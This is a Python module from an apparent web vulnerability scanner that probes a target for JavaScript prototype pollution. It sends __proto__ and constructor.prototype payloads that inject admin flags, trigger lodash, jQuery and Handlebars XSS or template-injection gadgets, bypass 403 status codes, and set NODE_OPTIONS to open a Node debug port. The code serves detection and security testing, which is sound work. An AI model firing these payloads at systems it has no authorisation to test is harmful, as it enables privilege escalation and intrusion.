"""
websecure.scanners.prototype_pollution
----------------------------------------
JavaScript Prototype Pollution vulnerability detector.

Techniques
----------
  1. JSON body injection  — POST/PUT with __proto__, constructor.prototype keys
  2. Query-string pollution — ?__proto__[x]=1, ?constructor[prototype][x]=1
  3. Deep-merge sink probe  — nested JSON objects that trigger polluted keys
  4. Reflected-property check — response body searched for canary value
  5. Server-side PP — Node.js admin property injection + stack trace detection
  6. Gadget detection — lodash/jQuery/Handlebars known gadget payloads
  7. PP-to-chain — status code bypass, template injection, env pollution

References
----------
  • https://portswigger.net/web-security/prototype-pollution
  • https://github.com/nicehash/node-prototype-pollution-test
"""
from __future__ import annotations

import json
import logging
import random
import re
import string
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from websecure.scanners.base import BaseScanner
from websecure.core.http import hardened_session
from websecure.core.payloads import load_external_payloads as _load_pp_payloads

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Canary value — unique per scan run
# ---------------------------------------------------------------------------
def _canary() -> str:
    return "wsp_" + "".join(random.choices(string.ascii_lowercase, k=8))


# ---------------------------------------------------------------------------
# JSON body payloads
# ---------------------------------------------------------------------------
def _json_payloads(canary: str) -> List[Dict[str, Any]]:
    """Return a list of JSON bodies that attempt prototype pollution."""
    return [
        # Direct __proto__ key
        {"__proto__": {"polluted": canary}},

        # constructor.prototype path
        {"constructor": {"prototype": {"polluted": canary}}},

        # Nested merge target
        {"a": {"__proto__": {"polluted": canary}}},

        # Array-like deep merge
        {"__proto__": {"polluted": canary, "toString": canary}},

        # Lodash-style deep clone target
        {"level1": {"level2": {"__proto__": {"polluted": canary}}}},

        # Unicode key variant (__proto__ with zero-width space)
        {"\u200b__proto__\u200b": {"polluted": canary}},

        # Numeric prototype pollution
        {"__proto__": {"0": canary, "length": 1}},

        # constructor chain
        {"constructor": {"prototype": {"constructor": {"prototype": {"polluted": canary}}}}},
    ]


# ---------------------------------------------------------------------------
# Query-string payloads
# ---------------------------------------------------------------------------
_QS_TEMPLATES: List[str] = [
    "__proto__[polluted]={c}",
    "__proto__.polluted={c}",
    "constructor[prototype][polluted]={c}",
    "constructor.prototype.polluted={c}",
    "__proto__[toString]={c}",
    "a[__proto__][polluted]={c}",
    "a.__proto__.polluted={c}",
    "obj[__proto__][polluted]={c}",
    # URL-encoded variants
    "%5B__proto__%5D%5Bpolluted%5D={c}",
    "constructor%5Bprototype%5D%5Bpolluted%5D={c}",
]


def _qs_payloads(base_url: str, canary: str) -> List[str]:
    """Return URLs with prototype-pollution query strings appended."""
    sep = "&" if "?" in base_url else "?"
    urls = []
    for tmpl in _QS_TEMPLATES:
        param = tmpl.format(c=urllib.parse.quote(canary, safe=""))
        urls.append(base_url + sep + param)
    return urls


# ---------------------------------------------------------------------------
# Response analysis
# ---------------------------------------------------------------------------
def _canary_in_response(resp, canary: str) -> bool:
    """Return True if the canary appears in the response text."""
    try:
        text = resp.text if hasattr(resp, "text") else resp.content.decode("utf-8", "replace")
        return canary in text
    except Exception:
        return False


def _build_finding(technique: str, url: str, payload: Any, canary: str) -> Dict[str, Any]:
    return {
        "type": "Prototype Pollution",
        "technique": technique,
        "url": url,
        "severity": "High",
        "description": (
            f"Prototype pollution candidate detected via {technique}. "
            f"Canary value '{canary}' was reflected in the response, indicating "
            "the injected __proto__ property may have been merged into a shared object."
        ),
        "evidence": {
            "payload": str(payload)[:300],
            "canary": canary,
        },
    }


# ---------------------------------------------------------------------------
# Advanced Probers — Server-Side PP, Gadgets, PP-to-Chain
# ---------------------------------------------------------------------------

class ServerSidePPProber(BaseScanner):
    """
    Server-side prototype pollution prober for Node.js/Express applications.
    Injects admin/isAdmin properties via __proto__ and constructor.prototype,
    both in JSON body and query string, then checks for reflection or stack traces.
    Single Responsibility: server-side PP detection only.
    """

    name = "pp_server_side"

    _SSPP_JSON_PAYLOADS: List[Dict[str, Any]] = [
        {"__proto__": {"admin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__": {"isAdmin": True, "role": "admin"}},
        {"__proto__": {"admin": True, "superuser": True}},
        {"constructor": {"prototype": {"isAdmin": True, "privileged": True}}},
    ]

    _QS_SSPP_TEMPLATES: List[str] = [
        "__proto__[admin]=true",
        "__proto__[isAdmin]=true",
        "constructor[prototype][admin]=true",
        "constructor[prototype][isAdmin]=true",
        "__proto__[role]=admin",
    ]

    _STACK_TRACE_PATTERNS = [
        r"at\s+\w+\s+\(.*\.js:\d+",     # Node.js stack frame
        r"express[/ ]\d+\.\d+",          # Express version leak
        r"node[/ ]\d+\.\d+",             # Node version leak
        r"TypeError:.*prototype",        # PP-related type error
        r"RangeError.*Maximum call",     # Stack overflow from pollution
    ]

    _ADMIN_RE = re.compile(
        r'"admin"\s*:\s*true|"isAdmin"\s*:\s*true|"role"\s*:\s*"admin"', re.I
    )

    def _admin_present(self, text: str) -> bool:
        return bool(self._ADMIN_RE.search(text or ""))

    def _confirm_persistent_pollution(self, target: str, base_had_admin: bool) -> bool:
        """Gerçek server-side PP, KİRLETMEDEN SONRA bağımsız bir TEMİZ istekte de
        property'yi gösterir (global prototype kirlendi). Echo API'leri (gönderdiğimiz
        gövdeyi geri yansıtan) bunu YAPAMAZ → echo-FP elenir. Baseline'da zaten varsa
        (uygulama her zaman admin:true döndürüyor) onaylama."""
        if base_had_admin:
            return False
        try:
            clean = self.session.get(target, timeout=10, allow_redirects=True)
            return self._admin_present(clean.text or "")
        except Exception as exc:
            logger.debug("[ServerSidePPProber] clean-probe confirm error: %s", exc)
            return False

    def run(self, target: str, **kwargs) -> None:
        # Pre-pollution baseline: uygulama temiz halde de admin:true döndürüyor mu?
        try:
            _b = self.session.get(target, timeout=10, allow_redirects=True)
            base_had_admin = self._admin_present(_b.text or "")
        except Exception as exc:
            logger.debug("[ServerSidePPProber] baseline error: %s", exc)
            base_had_admin = False

        # -- JSON body injection -----------------------------------------------
        for payload in self._SSPP_JSON_PAYLOADS:
            for method in ("POST", "PUT", "PATCH"):
                try:
                    resp = self.session.request(
                        method,
                        target,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                        allow_redirects=True,
                    )
                    text = resp.text or ""
                    # FP FIX: aynı yanıtta `"admin":true` görmek KANIT DEĞİL — gönderdiğimiz
                    # `{"__proto__":{"admin":true}}` payload'ını geri yansıtan (echo) her API
                    # bunu sağlar → sahte Critical. Gerçek SSPP, kirletmeden sonra bağımsız
                    # TEMİZ istekte de property'yi gösterir; clean-probe ile onaylanır.
                    if self._admin_present(text) and self._confirm_persistent_pollution(
                        target, base_had_admin
                    ):
                        self.report_finding(
                            vuln_type="Server-Side Prototype Pollution (Persisted Admin Property)",
                            url=target,
                            param=f"[JSON body {method}]",
                            payload=json.dumps(payload),
                            severity="Critical",
                            evidence=(
                                f"__proto__ admin property persisted into an independent clean "
                                f"request after {method} pollution (global prototype polluted). "
                                f"Payload: {json.dumps(payload)[:200]}"
                            ),
                        )
                        return

                    # Check for Node.js/Express stack trace (info leak)
                    for pat in self._STACK_TRACE_PATTERNS:
                        if re.search(pat, text, re.I | re.S):
                            self.report_finding(
                                vuln_type="Server-Side Prototype Pollution (Stack Trace Leak)",
                                url=target,
                                param=f"[JSON body {method}]",
                                payload=json.dumps(payload),
                                severity="Medium",
                                evidence=(
                                    f"Node.js/Express stack trace or version revealed "
                                    f"via prototype pollution probe ({method}). Pattern: {pat}"
                                ),
                            )
                            break

                except Exception as exc:
                    logger.debug("[ServerSidePPProber] JSON %s error: %s", method, exc)

        # -- Query-string injection ---------------------------------------------
        sep = "&" if "?" in target else "?"
        for qs_param in self._QS_SSPP_TEMPLATES:
            test_url = target + sep + qs_param
            try:
                resp = self.session.get(test_url, timeout=10, allow_redirects=True)
                text = resp.text or ""
                if self._admin_present(text) and self._confirm_persistent_pollution(
                    target, base_had_admin
                ):
                    self.report_finding(
                        vuln_type="Server-Side Prototype Pollution (QS Persisted Admin Property)",
                        url=target,
                        param=f"[Query: {qs_param}]",
                        payload=qs_param,
                        severity="Critical",
                        evidence=(
                            f"__proto__ admin property persisted into an independent clean "
                            f"request after query-string pollution. Param: {qs_param}"
                        ),
                    )
                    return
            except Exception as exc:
                logger.debug("[ServerSidePPProber] QS error: %s", exc)


class PPGadgetScanner(BaseScanner):
    """
    Prototype pollution gadget detector.
    Probes for known vulnerable library patterns (lodash, jQuery, Handlebars)
    that can turn prototype pollution into XSS or SSTI chains.
    Single Responsibility: gadget-chain detection only.
    """

    name = "pp_gadget"

    # (payload, library_name, check_pattern, check_description)
    _GADGET_PAYLOADS: List[Tuple] = [
        (
            {"__proto__": {"sourceURL": "\nalert(1)"}},
            "lodash",
            r"alert\(1\)",
            "lodash sourceURL gadget — XSS chain",
        ),
        (
            {"__proto__": {"url": "javascript:alert(1)"}},
            "jQuery",
            r"javascript:alert\(1\)",
            "jQuery url gadget — XSS chain",
        ),
        (
            {"__proto__": {"pendingContent": "{{7*7}}"}},
            "Handlebars",
            r"49",
            "Handlebars pendingContent gadget — SSTI+PP chain",
        ),
        (
            {"__proto__": {"template": "{{7*7}}"}},
            "Handlebars/EJS",
            r"49",
            "Template engine gadget — SSTI+PP chain (7*7=49)",
        ),
        (
            {"constructor": {"prototype": {"pendingContent": "{{7*7}}"}}},
            "Handlebars (constructor path)",
            r"49",
            "Handlebars SSTI via constructor.prototype — PP chain",
        ),
    ]

    def run(self, target: str, **kwargs) -> None:
        for payload, library, check_pat, description in self._GADGET_PAYLOADS:
            for method in ("POST", "PUT", "PATCH"):
                try:
                    resp = self.session.request(
                        method,
                        target,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                        allow_redirects=True,
                    )
                    text = resp.text or ""
                    if re.search(check_pat, text, re.I | re.S):
                        is_ssti = "49" in check_pat or "7\\*7" in check_pat
                        vuln_label = (
                            "Prototype Pollution → SSTI Chain (Critical)"
                            if is_ssti
                            else "Prototype Pollution → XSS Chain (Critical)"
                        )
                        self.report_finding(
                            vuln_type=vuln_label,
                            url=target,
                            param=f"[JSON {method} — {library} gadget]",
                            payload=json.dumps(payload),
                            severity="Critical",
                            evidence=(
                                f"Gadget library: {library}. {description}. "
                                f"Pattern '{check_pat}' matched in response."
                            ),
                        )
                        break
                except Exception as exc:
                    logger.debug("[PPGadgetScanner] %s %s error: %s", library, method, exc)


class PPToPollutionChainProber(BaseScanner):
    """
    Prototype pollution to exploit chain prober.
    Tests PP-to-403-bypass, PP-to-template-injection, PP-to-debug-env
    and PP-to-option-injection chains.
    Single Responsibility: PP exploit chain detection only.
    """

    name = "pp_chain"

    _CHAIN_PAYLOADS: List[Tuple] = [
        (
            {"__proto__": {"status": 200}},
            "status_bypass",
            "PP → status code bypass: __proto__.status=200 may bypass 403 guards",
        ),
        (
            {"__proto__": {"shell": "node", "NODE_OPTIONS": "--inspect=0.0.0.0:1337"}},
            "option_injection",
            "PP → NODE_OPTIONS injection: debug port exposure attempt",
        ),
        (
            {"__proto__": {"layout": "main", "content": "{{7*7}}"}},
            "template_injection",
            "PP → template injection: layout+content gadget (7*7=49)",
        ),
        (
            {"__proto__": {"env": {"NODE_ENV": "development"}}},
            "env_pollution",
            "PP → env pollution: NODE_ENV=development may enable debug mode",
        ),
        (
            {"constructor": {"prototype": {"status": 200}}},
            "status_bypass_constructor",
            "PP → status code bypass via constructor.prototype path",
        ),
        (
            {"constructor": {"prototype": {"layout": "main", "content": "{{7*7}}"}}},
            "template_constructor",
            "PP → template injection via constructor.prototype path",
        ),
    ]

    def run(self, target: str, **kwargs) -> None:
        # Fetch baseline to detect status code and content changes
        try:
            baseline_resp = self.session.get(target, timeout=10, allow_redirects=True)
            baseline_status = baseline_resp.status_code
            baseline_text = baseline_resp.text or ""
        except Exception as exc:
            logger.debug("[PPToPollutionChainProber] baseline failed: %s", exc)
            return

        was_forbidden = baseline_status in (403, 401)

        for payload, chain_type, description in self._CHAIN_PAYLOADS:
            for method in ("POST", "PUT", "PATCH"):
                try:
                    resp = self.session.request(
                        method,
                        target,
                        json=payload,
                        headers={"Content-Type": "application/json"},
                        timeout=10,
                        allow_redirects=True,
                    )
                    text = resp.text or ""

                    # 403 bypass detection
                    if chain_type in ("status_bypass", "status_bypass_constructor"):
                        if was_forbidden and resp.status_code == 200:
                            self.report_finding(
                                vuln_type="Prototype Pollution → 403 Bypass",
                                url=target,
                                param=f"[JSON {method}]",
                                payload=json.dumps(payload),
                                severity="Critical",
                                evidence=(
                                    f"Status changed from {baseline_status} to 200 "
                                    f"after PP status injection. {description}"
                                ),
                            )
                            break

                    # Template injection detection (7*7 = 49)
                    if chain_type in ("template_injection", "template_constructor"):
                        if re.search(r"\b49\b", text) and "49" not in baseline_text:
                            self.report_finding(
                                vuln_type="Prototype Pollution → Template Injection (SSTI)",
                                url=target,
                                param=f"[JSON {method}]",
                                payload=json.dumps(payload),
                                severity="Critical",
                                evidence=(
                                    f"Template expression {{{{7*7}}}} evaluated to 49 "
                                    f"after PP chain injection. {description}"
                                ),
                            )
                            break

                    # NODE_OPTIONS / debug port — yalnız GERÇEK Node inspector kanıtı.
                    # Eski regex bare "inspect"/"debugger" kelimesine takılıyordu (her
                    # "inspector"/"inspection" geçen metin FP). Gerçek sinyal: açık debug
                    # portu (9229), --inspect bayrağı veya Node'un "Debugger listening"
                    # banner'ı — ve baseline'da YOKKEN belirmeli.
                    if chain_type == "option_injection":
                        _opt_re = r"(?i)(Debugger listening on|--inspect(-brk)?\b|\b9229\b|ws://[^ ]*:9229)"
                        if re.search(_opt_re, text) and not re.search(_opt_re, baseline_text):
                            self.report_finding(
                                vuln_type="Prototype Pollution → NODE_OPTIONS Injection",
                                url=target,
                                param=f"[JSON {method}]",
                                payload=json.dumps(payload),
                                severity="Critical",
                                evidence=(
                                    f"Node.js inspector/debug indicator found in response "
                                    f"after NODE_OPTIONS injection. {description}"
                                ),
                            )
                            break

                    # Env pollution: development mode signals — SPESİFİK dev-mode kanıtı.
                    # Eski regex `(development|stack trace|error|debug)` "error" kelimesine
                    # takılıyordu → sayısız normal yanıt (örn. "Database Error") sahte
                    # "Debug Env Enabled" üretiyordu. Gerçek sinyal: NODE_ENV=development
                    # yansıması veya gerçek Node stack-trace frame'i ('at fn (x.js:12:3)')
                    # — ve baseline'da YOKKEN belirmeli.
                    if chain_type == "env_pollution":
                        _env_re = (
                            r"(?i)(NODE_ENV['\"]?\s*[:=]\s*['\"]?development"
                            r"|['\"]?env(ironment)?['\"]?\s*[:=]\s*['\"]?development"
                            r"|\bat\s+[\w.$<>]+\s*\([^)]*\.js:\d+:\d+\)"
                            r"|\bError:\s*\n\s*at\s)"
                        )
                        if re.search(_env_re, text) and not re.search(_env_re, baseline_text):
                            self.report_finding(
                                vuln_type="Prototype Pollution → Debug Env Enabled",
                                url=target,
                                param=f"[JSON {method}]",
                                payload=json.dumps(payload),
                                severity="High",
                                evidence=(
                                    f"Development/debug indicators appeared in response "
                                    f"after NODE_ENV=development pollution. {description}"
                                ),
                            )
                            break

                except Exception as exc:
                    logger.debug("[PPToPollutionChainProber] %s %s error: %s", chain_type, method, exc)


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------
def run(
    url: str,
    session=None,
    debug: bool = False,
    auth_ctx: Any = None,
    results: Optional[Dict] = None,
    **_,
) -> List[Dict[str, Any]]:
    """
    Test *url* for prototype pollution vulnerabilities.

    Returns a list of finding dicts (may be empty).
    """
    if debug:
        logger.setLevel(logging.DEBUG)

    # NOTE: bu modül-düzeyi run() bulguları LİSTE olarak döndürür (caller
    # phases._runner_prototype_pollution dönüş değerini add_result'a aktarır);
    # `results` param uniform scanner imzası için tutulur ama bu akışta yazılmaz.
    scan_results: List[Dict[str, Any]] = []
    canary = _canary()

    if session is None:
        session = hardened_session({})

    # -- 1. JSON body injection ----------------------------------------------
    for payload in _json_payloads(canary):
        for method in ("POST", "PUT", "PATCH"):
            try:
                resp = session.request(
                    method,
                    url,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10,
                    allow_redirects=True,
                )
                if _canary_in_response(resp, canary):
                    scan_results.append(_build_finding(
                        f"JSON body ({method})", url, payload, canary
                    ))
                    logger.info("[ProtoPollution] JSON body hit on %s (%s)", url, method)
                    break  # One finding per technique is enough
            except Exception as exc:
                logger.debug("[ProtoPollution] JSON %s error: %s", method, exc)
        if scan_results:
            break  # Stop after first confirmed JSON finding

    # -- 2. Query-string injection -------------------------------------------
    if not scan_results:
        # Built-in templates + wordlist-loaded QS payloads
        _wl_qs: List[str] = []
        try:
            _wl_qs = [
                p for p in _load_pp_payloads("prototype_pollution")
                if "=" in p and not p.startswith(("{", "<", "O:", "!!", "\\", '"', "&", "BAh", "rO0", "aced", "#"))
            ]
        except Exception as exc:
            logger.debug("[ProtoPollution] wordlist load error: %s", exc)

        for test_url in _qs_payloads(url, canary):
            try:
                resp = session.get(test_url, timeout=10, allow_redirects=True)
                if _canary_in_response(resp, canary):
                    scan_results.append(_build_finding(
                        "Query-string parameter", test_url, test_url, canary
                    ))
                    logger.info("[ProtoPollution] QS hit: %s", test_url)
                    break
            except Exception as exc:
                logger.debug("[ProtoPollution] QS error: %s", exc)

        # Wordlist-extended QS probing
        if not scan_results and _wl_qs:
            sep = "&" if "?" in url else "?"
            for qs_param in _wl_qs[:30]:
                test_url = url + sep + urllib.parse.quote(qs_param, safe="=[].")
                try:
                    resp = session.get(test_url, timeout=10, allow_redirects=True)
                    if _canary_in_response(resp, canary):
                        scan_results.append(_build_finding(
                            "Query-string parameter (wordlist)", test_url, test_url, canary
                        ))
                        logger.info("[ProtoPollution] QS wordlist hit: %s", test_url)
                        break
                except Exception as exc:
                    logger.debug("[ProtoPollution] QS wordlist error: %s", exc)

    # -- 3. Deep-merge probe (JSON PATCH) -----------------------------------
    deep_payload = {
        "data": {
            "__proto__": {"polluted": canary},
            "constructor": {"prototype": {"polluted": canary}},
        }
    }
    try:
        resp = session.patch(
            url,
            json=deep_payload,
            headers={"Content-Type": "application/merge-patch+json"},
            timeout=10,
            allow_redirects=True,
        )
        if _canary_in_response(resp, canary):
            scan_results.append(_build_finding(
                "JSON PATCH deep-merge", url, deep_payload, canary
            ))
    except Exception as exc:
        logger.debug("[ProtoPollution] PATCH probe error: %s", exc)

    # -- 4. Server-side PP prober -------------------------------------------
    sspp_results: Dict[str, Any] = {}
    sspp = ServerSidePPProber(session=session, results=sspp_results, debug=debug)
    sspp.run(url)
    for finding in (sspp_results.get("offensive") or []):
        if finding not in scan_results:
            scan_results.append(finding)

    # -- 5. Gadget detection ------------------------------------------------
    gadget_results: Dict[str, Any] = {}
    gadget = PPGadgetScanner(session=session, results=gadget_results, debug=debug)
    gadget.run(url)
    for finding in (gadget_results.get("offensive") or []):
        if finding not in scan_results:
            scan_results.append(finding)

    # -- 6. PP-to-chain prober ----------------------------------------------
    chain_results: Dict[str, Any] = {}
    chain = PPToPollutionChainProber(session=session, results=chain_results, debug=debug)
    chain.run(url)
    for finding in (chain_results.get("offensive") or []):
        if finding not in scan_results:
            scan_results.append(finding)

    return scan_results
